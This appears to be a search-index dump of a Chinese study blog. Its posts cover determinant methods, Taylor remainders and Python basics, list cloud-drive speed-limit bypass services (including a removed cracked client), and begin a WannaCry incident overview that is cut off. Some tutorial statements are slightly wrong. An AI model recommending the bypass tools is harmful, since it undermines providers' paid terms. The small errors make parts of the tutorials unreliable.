解法：用第一列或最后一列的非零元素消去第一行、最后一行的非零元素，化为三角行列式。 5. 分块行列式 结构特征：矩阵可分块为对角块、上三角块或下三角块，例如： 分块对角：$A = \\begin{pmatrix} A_1 \u0026amp; O \\ O \u0026amp; A_2 \\end{pmatrix}$（$O$为零矩阵）； 分块上三角：$A = \\begin{pmatrix} A_1 \u0026amp; B \\ O \u0026amp; A_2 \\end{pmatrix}$。 适用情况：分块后非对角块为零矩阵（或可通过变换化为零块）。 解法：套用分块行列式公式： 分块对角：$|A| = |A_1| \\cdot |A_2| \\cdots |A_k|$； 分块上/下三角：$|A| = |A_1| \\cdot |A_2| \\cdots |A_k|$（仅需对角块非奇异）。 6. Hessenberg行列式 结构特征：上Hessenberg（主对角线下方仅一条非零元素带）或下Hessenberg（主对角线上方仅一条非零元素带）：\n$$D_n = \\begin{vmatrix} a_{11} \u0026 a_{12} \u0026 \\cdots \u0026 a_{1n} \\\\ a_{21} \u0026 a_{22} \u0026 \\cdots \u0026 a_{2n} \\\\ \u0026 a_{32} \u0026 \\cdots \u0026 a_{3n} \\\\ \u0026 \u0026 \\ddots \u0026 \\vdots \\\\ \u0026 \u0026 \u0026 a_{nn} \\end{vmatrix}$$ 适用情况：带状结构、非零元素集中在主对角线附近。 解法：按第一列（或最后一列）展开，建立递推关系求解。 三、方法选择优先级总结 先判断是否为特殊结构（范德蒙德、爪型、三角等）→ 直接套用专门公式； 若为普通行列式，先看是否有多零元素行（列） → 按行（列）展开降阶； 无明显零元素→ 用初等变换法化三角（3阶及以上首选）； 结构对称/带状→ 用递推法；需证明结果→ 用数学归纳法。 ","date":"2025-11-14T23:40:45+08:00","permalink":"https://www.retr0.xyz/p/%E7%AE%97%E8%A1%8C%E5%88%97%E5%BC%8F%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/","title":"算行列式的几种方法"},{"content":" 多项式+余项=公式\n一、泰勒多项式（Taylor Polynomial） 定义 设函数$ f(x) $在点$ x = a $处$ n $阶可导，则以$ x = a $为中心的$ n $次泰勒多项式为： $$ P_n(x) = f(a) + f'(a)(x - a) + \\frac{f''(a)}{2!}(x - a)^2 + \\cdots + \\frac{f^{(n)}(a)}{n!}(x - a)^n $$核心特点 本质：用$ f(x) $在$ x = a $处的函数值及各阶导数值，构造多项式逼近$ f(x) $； 局部性：在$ a $的邻域内逼近效果好，阶数$ n $越高，逼近越精确。 二、麦克劳林多项式（Maclaurin Polynomial） 定义 泰勒多项式的特殊情况——当中心$ a = 0 $时，$ n $次麦克劳林多项式为： $$ P_n(x) = f(0) + f'(0)x + \\frac{f''(0)}{2!}x^2 + \\cdots + \\frac{f^{(n)}(0)}{n!}x^n $$核心特点 简化形式：无需考虑$ (x - a) $项，直接以$ x $的幂次展开； 适用场景：$ f(x) $在$ x = 0 $处易求各阶导数（如$ e^x $、$ \\sin x $、$ \\cos x $等）。 三、拉格朗日余项（Lagrange Remainder） 定义 泰勒公式中，$ f(x) $与泰勒多项式$ P_n(x) $的误差（定量余项），表达式为： $$ R_n(x) = \\frac{f^{(n+1)}(\\xi)}{(n+1)!}(x - a)^{n+1} $$ 其中$ \\xi $是介于$ a $与$ x $之间的某个数。\n核心特点 定量误差：给出误差的具体表达式，可精确估计逼近精度； 条件：要求$ f(x) $在$ a $的邻域内$ n+1 $阶可导。 四、佩亚诺余项（Peano Remainder） 定义 泰勒公式中，误差的定性描述（高阶无穷小余项），表达式为： $$ R_n(x) = o\\left((x - a)^n\\right) \\quad (x \\to a) $$核心特点 定性误差：仅说明“当$ x \\to a $时，误差是$ (x - a)^n $的高阶无穷小”，不给出具体大小； 条件：仅需$ f(x) $在$ x = a $处$ n $阶可导，要求比拉格朗日余项低。 ","date":"2025-11-14T23:40:16+08:00","permalink":"https://www.retr0.xyz/p/%E5%87%A0%E7%A7%8D%E5%A4%9A%E9%A1%B9%E5%BC%8F%E5%8F%8A%E4%BD%99%E9%A1%B9/","title":"几种多项式及余项"},{"content":"文件编码 文件的读取操作 open()打开函数 使用open函数，可以打开一个已经存在的文件，或者创建一个新文件，语法如下\nopen(name,mode,encoding)\nname：是要打开的目标文件名的字符串（可以包含文件所在的具体路径）\nmode：设置打开文件的模式（访问模式）：只读r、写入w、追加a等。\nencoding：编码格式（推荐使用UTF-8）\n示例：\n1 2 f = open(\u0026#39;python.txt\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#34;UTF-8\u0026#34;) # encoding的顺序不是第三位，所以不能用位置参数，用关键字参数直接指定 注意：此处‘f’是‘open’函数的文件对象，对象是Python中一种特殊的数据类型，拥有属性和方法可以使用对象.属性或对象.方法访问。\n模式 描述 r 以只读方式打开文件。文件的指针会放在文件的开头。这是默认模式。 w 打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，原有内容会被删除 。 a 打开一个文件用于追加。如果该文件已存在，新的内容会被写道已有内容之后。如果该文件 不存在，创建新文件 进行写入。 read()方法 文件对象.read(num) num表示要从文件中读取的数据的长度（单位是字符），如果没有传入num，那么就表示读取文件中所有的数据。\n例如：\n1 2 3 4 # 有test.txt文件内容为：abcdefghijk f = open(\u0026#39;test.txt\u0026#39;) print(f.read(3))\t# 输出abc print(f.read(5))\t# 输出defgh readlines()方法 readlines可以按照行的方式把整个文件中的内容进行一次性读取，并且返回的是一个列表，其中返回的是一个 列表 ，其中每一行的数据为一个元素。\n示例：\n1 2 3 4 5 6 7 8 # 有python.txt文件内容为： # abc # def # ghi f = open(\u0026#39;python.txt\u0026#39;) content = f.readlines() print(content)\t# 输出[\u0026#39;abc\\n\u0026#39;,\u0026#39;def\\n\u0026#39;,\u0026#39;ghi\\n\u0026#39;] 此处\\n为换行符 f.close()\t# 关闭文件 注意：连续调用多次read或readlines，后面的read会接着前面的继续读取而不是从头开始，相当于每次读取时文本中会有一个指针再向后读取，读到最后就没有东西可读了\nreadline()方法 readline可以一次读取一行内容\n1 2 3 4 5 6 7 8 9 10 # 有python.txt文件内容为： # abc # def # ghi f = open(\u0026#39;python.txt\u0026#39;) content = f.readline() print(f\u0026#39;第一行:{content}\u0026#39;)\t# 输出 abc content = f.readline() print(f\u0026#39;第二行:{content}\u0026#39;)\t# 输出 def f.close for循环读取文件行 示例：\n1 2 for line in open(\u0026#39;python.txt\u0026#39;,\u0026#39;r\u0026#39;): print(line) 文件的关闭 前面已经有提到，以对象名为\u0026rsquo;f\u0026rsquo;为例：\nf.close()\nwith open()语法 通过在with open的语句块中对文件进行操作，可以在操作完成后自动关闭close文件，避免遗忘掉close方法\n以对象名为\u0026rsquo;f\u0026rsquo;为例：\n1 2 with open(\u0026#39;python.txt\u0026#39;,\u0026#39;r\u0026#39;)as f: f.readline() ","date":"2025-11-14T23:36:48+08:00","permalink":"https://www.retr0.xyz/p/8.1-%E6%96%87%E4%BB%B6%E7%9A%84%E8%AF%BB%E5%8F%96%E6%93%8D%E4%BD%9C/","title":"8.1 文件的读取操作"},{"content":"多个返回值的写法 1 2 3 4 5 def test(): return 1,2 a,b= test() print(a) print(b) 按照返回值的顺序，写对应的多个变量接收即可\n变量之间用逗号隔开\n支持不同类型的数据return\n函数的多种参数使用形式 位置参数 调用时根据函数定义的参数位置来传递参数\n1 2 3 def user_info(name,age,gender): print(f\u0026#39;您的姓名是{name}，年龄是{age}，性别是{gender}\u0026#39;)\t# 注意此处print内有f，意为在字符串内插入表达式 user_info(\u0026#39;Retr0\u0026#39;,18,\u0026#39;男\u0026#39;) 关键字参数 调用时通过“键=值”形式传递参数\n1 2 3 4 5 6 7 8 def user_info(name,age,gender): print(f\u0026#39;您的姓名是{name}，年龄是{age}，性别是{gender}\u0026#39;) # 关键字传参 user_info(name=\u0026#39;小明\u0026#39;,age=20,gender=\u0026#39;男\u0026#39;) # 可以不按照固定顺序 user_info(age=20,gender=\u0026#39;男\u0026#39;,name=\u0026#39;小明\u0026#39;) # 可以和位置参数混用，位置参数必须在前，且匹配参数顺序 user_info(\u0026#39;小明\u0026#39;,age=20,gender=\u0026#39;男\u0026#39;) 注意：函数调用时，如果有位置参数时位置参数必须在关键字参数的前面，但关键字参数之间不存在先后顺序\n缺省参数 也叫默认参数，用于定义函数，为参数提供默认值，调用函数时刻不传该默认参数的值\n注意：所有位置参数必须出现在默认参数前，包括函数定义和调用\n1 2 3 4 def user_info(name,age,gender=\u0026#39;男\u0026#39;): print(f\u0026#39;您的姓名是{name}，年龄是{age}，性别是{gender}\u0026#39;) user_info(\u0026#39;Retr0\u0026#39;,20) user_info(\u0026#39;小红\u0026#39;,20,\u0026#39;女\u0026#39;) 函数调用时，如果为缺省参数传值则修改默认参数值，否则使用这个默认值\n不定长参数 也叫可变参数，用于不确定调用的时候会传递多少个参数（不传参也可以）的场景\n类型包括：\n位置传递 1 2 3 4 def test(*args):\t# *标记表示args这个形式参数接收的参数数量无限，且采用位置传递 print(args) test(\u0026#39;Retr0\u0026#39;) test(\u0026#39;Retr0\u0026#39;,\u0026#39;18\u0026#39;) 传进的所有参数都会被args变量收集，它会根据传进参数的位置合并为一个元组，args是元组类型\n关键字参数 1 2 3 def test(**kwargs):\t# **标记表示kwargs这个形式参数接收的参数数量无限，且采用关键字传递 print(kwargs) test(name=\u0026#39;Retr0\u0026#39;,age=18,gender=\u0026#39;男\u0026#39;) 参数是“键=值”的形式的情况下，所有的“键=值”都会被kwargs接受，同时根据“键=值”组成字典\n函数作为参数传递 示例：\n1 2 3 4 5 6 def test(compute): result = compute(1,2) print(result) def compute(x,y): return x + y test(compute) 此处函数compute作为参数传入了test函数中使用\n实质上数据由test函数内部传入的compute函数进行计算\n所以这是一种**计算逻辑的传递，而非数据的传递，而任何逻辑都可以自行定义并作为函数传入**\nlambda匿名函数 众所周知，\ndef 关键字，可以定义带有名称的函数\n而 lambda关键字，可以定义匿名函数（无名称）\n有名称的函数，可以基于名称重复使用\n无名称的匿名函数，只能临时使用一次\n匿名函数定义语法 lambda 传入参数: 函数体(一行代码)\nlambda 是关键字，表示定义匿名函数 传入参数表示匿名函数的形式参数，如：x，y表示接收2个形式参数 函数体，就是函数的执行逻辑，要注意：只能写一行，无法写多行代码 例如：\n1 2 3 4 def test(compute): result = compute(1,2) print(result) test(lambda x,y:x+y) ","date":"2025-11-11T22:51:43+08:00","permalink":"https://www.retr0.xyz/p/7.1-%E8%BF%9B%E9%98%B6%E5%87%BD%E6%95%B0/","title":"7.1 进阶函数"},{"content":"统计容器的元素个数 len 前几篇中都有提到，不做演示\n统计容器的最大元素 max 1 2 list = [1,2,3,4,5] print(max(list)) 统计容器的最小元素 min 1 2 list = [1,2,3,4,5] print(min(list)) 注意：字符串的比较大小原则按照ASCII表顺序比较,从第一个字符开始一位位比较只要有一个字符大整体就大\n类型转换 1 2 3 4 5 6 7 list = [\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;e\u0026#39;] A = tuple(list) B = str(list) C = set(list) print(A,type(A)) print(B,type(B)) print(C,type(C)) 需要注意：\n字符串转列表\n1 2 s = \u0026#39;abcde\u0026#39; print(list(s))\t# 输出[\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;] 字典转列表\n1 2 dict = {\u0026#39;key1\u0026#39;:1,\u0026#39;key2\u0026#39;:2,\u0026#39;key3\u0026#39;:3} print(list(dict))\t# 输出[\u0026#39;key1\u0026#39;, \u0026#39;key2\u0026#39;, \u0026#39;key3\u0026#39;] 舍弃了value 字典转字符串\n1 2 dict = {\u0026#39;key1\u0026#39;:1,\u0026#39;key2\u0026#39;:2,\u0026#39;key3\u0026#39;:3} print(str(dict))\t# 输出{\u0026#39;key1\u0026#39;: 1, \u0026#39;key2\u0026#39;: 2, \u0026#39;key3\u0026#39;: 3} 全部保留 排序 此处为《数据容器：列表》2.9 列表的排序 的复制版本\n见链接 数据容器：列表\n默认升序（数字从小到大，首字母从前到后），且会修改当前列表\n1 2 3 4 5 6 list1 = [10, 8, 3, 22, 33, 7, 11, 100, 54] list2 = [\u0026#39;f\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;a\u0026#39;,\u0026#39;e\u0026#39;] list1.sort() list2.sort() print(list1) print(list2) 可选参数：reverse\t降序\n1 2 3 list = [1,2,3,4,5] list.sort(reverse=True) print(list) 可选参数：key\t自定义排序\n1 2 3 list = [\u0026#39;java\u0026#39;,\u0026#39;python\u0026#39;,\u0026#39;C++\u0026#39;,\u0026#39;go\u0026#39;] list.sort(key=len)\t#此处以长度为参考量，仅为其中一种用法 print(list) 你也可以将其组合\n1 2 3 list = [\u0026#39;java\u0026#39;,\u0026#39;python\u0026#39;,\u0026#39;C++\u0026#39;,\u0026#39;go\u0026#39;] list.sort(key=len,reverse=True)\tprint(list) sorted()函数 用法与sort()一致，但是不会修改列表本身，而是将修改后的列表创建一个副本。简而言之，你需要一个变量来接收它。\n1 2 3 list = [\u0026#39;java\u0026#39;,\u0026#39;python\u0026#39;,\u0026#39;C++\u0026#39;,\u0026#39;go\u0026#39;] a = sorted(list,key=len,reverse=True) print(a) 我们来比较一下二者的区别\n1 2 3 4 5 6 7 8 list1 = [5,4,3,2,1] list2 = [5,4,3,2,1] list3 = list1.sort() list4 = sorted(list2) print(list1)\t#[1, 2, 3, 4, 5]\t列表本身也被修改 print(list2)\t#[5, 4, 3, 2, 1]\t可见列表本身未被修改 print(list3)\t#None\t因为sort()函数不会传出修改后的列表 print(list4)\t#[1, 2, 3, 4, 5]\t","date":"2025-11-09T17:49:07+08:00","permalink":"https://www.retr0.xyz/p/6.7-%E6%95%B0%E6%8D%AE%E5%AE%B9%E5%99%A8%E7%9A%84%E9%80%9A%E7%94%A8%E6%93%8D%E4%BD%9C/","title":"6.7 数据容器的通用操作"},{"content":" 网盘 地址 使用说明 百度 Vite App 无使用条件,解析50个文件,大小限制 10TB 内(每日刷新) 百度 百度网盘资源搜索 因成本问题,该站点已经停止运行 百度 百度网盘资源搜索 需要获取解析密码,解析20个文件,大小限制 30GB 内(每日刷新) 夸克 Kdown - 夸克网盘解析 Free版本 需要获取解析密码,无数量限制,无大小限制 阿里 https://bw.01233.xyz/alipan 寄了 百度 KDown-Free - 百度网盘解析工具 需要获取解析密码,无数量限制,无大小限制 迅雷 客户端破解 因被投诉,已删除下架 安卓端下载器:AriaNgGUI\nPC端下载器:Motrix\n","date":"2025-11-08T20:57:28+08:00","permalink":"https://www.retr0.xyz/p/%E4%B8%BB%E6%B5%81%E7%BD%91%E7%9B%98%E8%A7%A3%E6%9E%90%E6%BB%A1%E9%80%9F%E4%B8%8B%E8%BD%BD-%E7%99%BE%E5%BA%A6%E5%A4%B8%E5%85%8B%E8%BF%85%E9%9B%B7%E9%98%BF%E9%87%8C/","title":"主流网盘解析,满速下载 ,(百度,夸克,迅雷,阿里)"},{"content":" Python中，字典（Dictionary）是一种内置的数据结构，用于存储键值对的集合。它是一种可变容器，允许用户存储任意类型的对象。字典中的每个元素由一个键（key）和一个值（value）组成，键和值之间用冒号（:）分隔，而各个键值对之间用逗号（,）分隔，整个字典被包含在花括号（{}）中。\n字典的定义 字典标准格式 1 2 3 4 5 # 定义字典变量 dict = {key:value,key:value,……,key:value} # 定义空字典 dict = {} dict = dict() 使用例：\n1 2 # 使用字典记录学生及其成绩 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} 字典数据的获取 字典不支持下标索引，可以通过Key值来取得对应的Value\n1 2 3 4 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} print(dict[\u0026#39;小明\u0026#39;]) print(dict[\u0026#39;小华\u0026#39;]) print(dict[\u0026#39;小红\u0026#39;]) 字典的嵌套 字典的Key和Value可以是任意数据类型 （Key不可以是字典）\n使用例：使用字典记录学生及其成绩\n姓名 语文 数学 英语 小明 77 66 33 小华 88 86 55 小红 99 96 66 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 score = { \u0026#39;小明\u0026#39;:{ \u0026#39;语文\u0026#39;:77, \u0026#39;数学\u0026#39;:66, \u0026#39;英语\u0026#39;:33 },\u0026#39;小华\u0026#39;:{ \u0026#39;语文\u0026#39;:88, \u0026#39;数学\u0026#39;:86, \u0026#39;英语\u0026#39;:55 },\u0026#39;小红\u0026#39;:{ \u0026#39;语文\u0026#39;:99, \u0026#39;数学\u0026#39;:96, \u0026#39;英语\u0026#39;:66 } } print(score) # 接下来是索引教程 # 此处查询小华的数学成绩 print(score[\u0026#39;小华\u0026#39;][\u0026#39;数学\u0026#39;])\t#输出 86 字典的常用操作 字典的新增元素 直接对新元素执行以下命令即可\n1 2 3 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} dict[\u0026#39;小芳\u0026#39;] = 94 print(dict) 字典的更新/修改元素 字典Key不可重复，所以直接对已有元素执行以下命令即可\n1 2 3 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} dict[\u0026#39;小明\u0026#39;] = 100 print(dict) 删除元素 pop 删除的同时取出元素\n1 2 3 4 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} a = dict.pop(\u0026#39;小红\u0026#39;) print(dict) print(a) 清空字典 1 2 3 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} dict.clear() print(dict) 获取全部的Key keys 和pop相同，你需要用变量来接收\n1 2 3 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} a = dict.keys() print(a)\t# 输出 dict_keys([\u0026#39;小明\u0026#39;, \u0026#39;小华\u0026#39;, \u0026#39;小红\u0026#39;]) 统计字典内的元素数量 len 1 2 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} print(len(dict)) 字典的遍历 由于不能通过下标索引，字典同样不支持while循环\nfor函数 方式一：使用 2.5获取全部的Key keys 处的指令\n1 2 3 4 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} k = dict.keys()\t#此处的k本质是列表，所以接下来参考列表的遍历 for m in k: print(m,\u0026#39;的成绩是\u0026#39;,dict[m]) 方式二：直接遍历\n1 2 3 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} for k in dict: print(k,\u0026#39;的成绩是\u0026#39;,dict[k]) ","date":"2025-11-07T22:21:09+08:00","permalink":"https://www.retr0.xyz/p/6.6-%E6%95%B0%E6%8D%AE%E5%AE%B9%E5%99%A8%E5%AD%97%E5%85%B8/","title":"6.6 数据容器：字典"},{"content":" 集合不支持元素的重复（自带去重功能），并且内容无序。\n集合的定义 1 2 3 4 5 # 定义集合变量 a = {1,2,3,4,5,4,3,2,1} # 定义空集合 b = set() print(a)\t# 输出{1, 2, 3, 4, 5} 发现自动去重 集合的常用操作 因为集合是无序的，所以集合 不支持下标索引 ，但是集合是可以修改的\n添加新元素 add 1 2 3 4 a = {1,2,3,4,5,\u0026#39;hi\u0026#39;} a.add(\u0026#39;hello\u0026#39;)\t# 添加成功 a.add(\u0026#39;hi\u0026#39;)\t# 添加失败，因为被自动去重 print(a)\t# 输出{1, 2, 3, 4, 5, \u0026#39;hi\u0026#39;, \u0026#39;hello\u0026#39;} 移除元素 remove 1 2 3 a = {1,2,3,4,5,\u0026#39;hi\u0026#39;} a.remove(\u0026#39;hi\u0026#39;) print(a) 从集合中随机抽取元素 pop 1 2 3 4 a = {1,2,3,4,5,\u0026#39;hi\u0026#39;} b = a.pop() print(a) print(b) 注意：取出元素后集合本身被修改，对应元素移除，因此你需要用一个变量来接收取出的元素\n清空集合 clear 1 2 3 a = {1,2,3,4,5,\u0026#39;hi\u0026#39;} a.clear() print(a) 取出两个集合的差集 difference 语法：集合1.difference(集合2)，功能：取出集合1和集合2的差集 (集合1有而集合2没有的，即 C=A-A∩B)\n结果：得到一个新集合，集合1和集合2不变\n1 2 3 4 5 6 set1 = {1,2,3} set2 = {1,5,6} set3 = set1.difference(set2) print(set3)\t# 结果：{2,3} 得到的新集合 print(set1)\t# 结果：{1,2,3} 不变 print(set2)\t# 结果：{1,5,6} 不变 消除两个集合的差集 语法：集合1.difference_update(集合2)\n功能：对比集合1和集合2，在集合1内，删除和集合2相同的元素（即 A=A-A∩B）\n因此只有集合1被修改，不会产生新的集合。\n1 2 3 4 5 set1 = {1,2,3} set2 = {1,5,6} set1.difference_update(set2) print(set1)\t# 结果{2, 3}，被修改 print(set2)\t# 结果{1,5,6}，不变 两个集合合并 语法：集合1.union(集合2)\n功能：将集合1和集合2合并为新集合\n1 2 3 4 5 6 set1 = {1,2,3} set2 = {1,5,6} set3 = set1.union(set2) print(set3)\t# 结果：{1,2,3,5,6}，新集合 print(set1)\t# 结果：{1,2,3}，不变 print(set2)\t# 结果：{1,5,6}，不变 统计集合元素数量 1 2 a = {1,2,3,4,5,\u0026#39;hi\u0026#39;} print(len(a)) 集合的循环遍历 注意：因为集合不支持下标索引，所以无法为while循环提供条件，因此只能使用for循环\nfor循环 1 2 3 a = {1,2,3,4,5,\u0026#39;hi\u0026#39;} for element in a: print(element) ","date":"2025-11-06T22:30:30+08:00","permalink":"https://www.retr0.xyz/p/6.5-%E6%95%B0%E6%8D%AE%E5%AE%B9%E5%99%A8%E9%9B%86%E5%90%88/","title":"6.5 数据容器：集合"},{"content":" 序列是指：内容连续、有序，可使用下标索引的一类数据容器\n列表、元组、字符串，均可以视为序列。\n序列的切片 切片：从一个序列中，取出一个子序列。\n语法：序列[起始下标:结束下标:步长]\n表示从序列中,从指定位置开始,依次取出元素,到指定位置结束,得到一个新序列:\n起始下标表示从何处开始,可以留空,留空视作从头开始 结束下标**(不含)**表示何处结束,可以留空,留空视作截取到结尾(包含尾部) 步长表示,依次取元素的间隔 步长1表示,一个个取元素(默认为1) 步长2表示,每次跳过1个元素取 步长N表示,每次跳过N-1个元素取 步长为负数表示,反向取(注意,起始下标和结束下标也要反向标记) 注意：切片操作不会对原序列进行修改，而是会得到新的序列\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 对List进行切片,从1开始,4结束,步长1 list = [0,1,2,3,4,5,6] print(list[1:4])\t#输出[1, 2, 3] # 对tuple进行切片,从头开始,到最后结束,步长1 tuple = (0,1,2,3,4,5,6) print(tuple[:])\t#输出(0, 1, 2, 3, 4, 5, 6) # 对str进行切片,从头开始,到最后结束,步长2 str = \u0026#39;01234567\u0026#39; print(str[::2])\t#输出0246 # 对str进行切片,从头开始,到最后结束,步长-1 str = \u0026#39;01234567\u0026#39; print(str[::-1])\t#输出76543210 # 对列表进行切片,从3开始,到1结束,步长-1 list = [0,1,2,3,4,5,6] print(list[3:1:-1])\t#输出[3, 2] #对元组进行切片,从头开始,到尾结束,步长-2 tuple = (0,1,2,3,4,5,6) print(tuple[::-2])\t#输出(6, 4, 2, 0) ","date":"2025-11-05T18:17:46+08:00","permalink":"https://www.retr0.xyz/p/6.4-%E5%BA%8F%E5%88%97%E7%9A%84%E6%93%8D%E4%BD%9C%E5%88%87%E7%89%87/","title":"6.4 序列的操作：切片"},{"content":" 字符串是字符的容器，一个字符串可以存放任意数量的字符。字符串同样无法修改。\n字符串的定义 字符串中的每个字符都为一个元素，同样可以用下标号索引，例如：\n1 2 3 s = \u0026#39;hello\u0026#39; print(s[0])\t#输出h print(s[-1])\t#输出o 此外，需要注意空格也属于一种字符\n1 2 3 s = \u0026#39;you and me\u0026#39; print(s[3]) print(s[-3])\t#输出空格 字符串的常用操作 找到特定字符串的下标 1 2 s = \u0026#39;you and me\u0026#39; print(s.index(\u0026#39;and\u0026#39;))\t#输出4 字符串的替换 1 2 3 4 s1 = \u0026#39;12345666\u0026#39; s2 = s1.replace(\u0026#39;6\u0026#39;,\u0026#39;7\u0026#39;)\t#字符串.replace（‘要替换的字符’，‘替换后的字符’） print(s1)\t#输出12345666 print(s2)\t#输出12345777 可见replace并没有修改字符串本身，而是产生了一个新字符串，因此你需要一个变量来接收它\n字符串的分割 1 2 3 4 s1 = \u0026#39;you and me\u0026#39; s2 = s1.split(\u0026#39; \u0026#39;)\t#字符串.split(\u0026#39;分割依据\u0026#39;) print(s1)\t#输出you and me print(s2)\t#输出[\u0026#39;you\u0026#39;, \u0026#39;and\u0026#39;, \u0026#39;me\u0026#39;] 在括号内填入你想要按照哪一个字符分割后，split会将原字符串分割为若干元素并装入一个列表\n但是原字符串仍被未修改，因此你需要一个变量来接收分割结果\n字符串的规整操作 当括号内不填参数时，strip会去除字符串前后的空格\n1 2 s = \u0026#39; you and me \u0026#39; print(s.strip())\t#输出you and me 当括号内填入参数后，strip会去除字符串首尾全部满足参数的字符（不严格：满足参数的任意字符就去除）例：\n1 2 s = \u0026#39;23you and me34\u0026#39; print(s.strip(\u0026#39;234\u0026#39;))\t#输出you and me 此处表明于strip并不是找到'234\u0026rsquo;这一整体才去除，而是把'2\u0026rsquo;、\u0026lsquo;3\u0026rsquo;、\u0026lsquo;4\u0026rsquo;分别都去除\n统计字符串中某字符串出现的次数 1 2 s = \u0026#39;itheima and itcast\u0026#39; print(s.count(\u0026#39;it\u0026#39;))\t#输出2 严格按照所查找字符串整体查找，区分大小写\n统计字符串的长度 同样包括空格，用法与之前相同\n1 2 s = \u0026#39;you and me\u0026#39; print(len(s))\t#输出10 字符串的遍历 while循环 示例：\n1 2 3 4 5 6 s = \u0026#39;12345\u0026#39; index = 0 while index \u0026lt; len(s): a = s[index] print(a)\t#对元素a进行处理 index += 1 for循环 示例：\n1 2 3 4 s = \u0026#39;12345\u0026#39; for i in range (0,len(s)): a = s[i] print(a) ","date":"2025-11-04T17:45:08+08:00","permalink":"https://www.retr0.xyz/p/6.3-%E6%95%B0%E6%8D%AE%E5%AE%B9%E5%99%A8%E5%AD%97%E7%AC%A6%E4%B8%B2/","title":"6.3 数据容器：字符串"},{"content":" 什么是元组？\n元组是Python中的一种基本数据结构，它是一个不可变的序列，意味着一旦创建，元组中的元素不能被修改、添加或删除。\n元组的定义 定义元组使用小括号，且用逗号隔开各个数据，数据可以是不同数据类型\n1 2 3 4 tuple = (1,2,\u0026#39;ok\u0026#39;,4,5,True) #定义空元组 a = ()\t#方式1 b = tuple()\t#方式2 注意：如果元组中只有一个元素，它的后面也要加上逗号，例如\n1 tuple = (\u0026#39;hello\u0026#39;,) 此外，元组也可以嵌套\n1 tuple = ((1,2,3),(4,5,6)) 元组的常用操作\t（同列表基本一致） 元组的索引 元组同样支持通过下标号正反向索引\n1 2 3 t = (\u0026#39;一\u0026#39;,\u0026#39;二\u0026#39;,\u0026#39;三\u0026#39;,\u0026#39;四\u0026#39;,\u0026#39;五\u0026#39;) print(t[0]) print(t[-1]) 查询元组中元素的下标号 同样只查询到第一个匹配的元素\n1 2 t = (\u0026#39;一\u0026#39;,\u0026#39;二\u0026#39;,\u0026#39;三\u0026#39;,\u0026#39;四\u0026#39;,\u0026#39;五\u0026#39;) print(t.index(\u0026#39;三\u0026#39;)) 统计某元素在元组中的数量 1 2 t = (1,2,3,2,4,2,5) print(t.count(2)) 统计元组内全部元素数量 1 2 t = (\u0026#39;一\u0026#39;,\u0026#39;二\u0026#39;,\u0026#39;三\u0026#39;,\u0026#39;四\u0026#39;,\u0026#39;五\u0026#39;) print(len(t)) 特别：修改元组内的列表的元素 1 2 3 t1 = (1,2,[\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;hello\u0026#39;]) t1[2][2] = \u0026#39;c\u0026#39; print(t1) 元组的循环遍历 while循环 示例：\n1 2 3 4 5 6 t = (1,2,3,4,5) index = 0 while index \u0026lt; len(t): a = t[index] print(a)\t#对元素a进行处理 index += 1 for循环 示例：\n1 2 3 4 t = (1,2,3,4,5) for i in range (0,len(t)): a = t[i] print(a) 紧急考点补充：zip()函数 Python 中的 zip() 函数用于将多个可迭代对象作为参数，将每个对象中对应的元素打包成一个元组，然后返回这些元组组成的列表。如果传入的迭代器长度不一致，zip() 函数会以最短的迭代器长度为准，返回相同长度的列表。\n在 Python 3 中，为了节约内存，zip() 返回的是一个对象。如果需要展示列表，需要使用 ·list()· 函数进行转换。\n1 2 3 4 5 6 a = [1, 2, 3] b = [4, 5, 6] zipped = zip(a, b) # 返回一个对象 print(zipped) print(list(zipped)) # 使用 list() 转换为列表 # 输出: [(1, 4), (2, 5), (3, 6)] ","date":"2025-11-03T18:14:15+08:00","permalink":"https://www.retr0.xyz/p/6.2-%E6%95%B0%E6%8D%AE%E5%AE%B9%E5%99%A8%E5%85%83%E7%BB%84/","title":"6.2 数据容器：元组"},{"content":"一、事件概述 1. 攻击爆发与范围 时间：2017 年 5 月 12 日，黑客利用美国国家安全局（NSA）泄露的 \u0026ldquo;永恒之蓝\u0026rdquo;（EternalBlue）漏洞发动攻击，迅速波及全球。\n规模：超过 150 个国家、30 多万台设备被感染，包括英国 NHS 医院、中国高校、俄罗斯电信公司等关键基础设施。\n行业影响：医疗系统瘫痪导致手术延误，教育机构数据丢失影响毕业季，物流企业供应链中断，全球经济损失估算达40 亿至 500 亿美元。\n被入侵的公安网 某加油站中毒 某高校机房中毒 2. 传播与加密机制 蠕虫式传播：病毒通过扫描开放 445 端口（SMB 协议）的 Windows 设备，利用 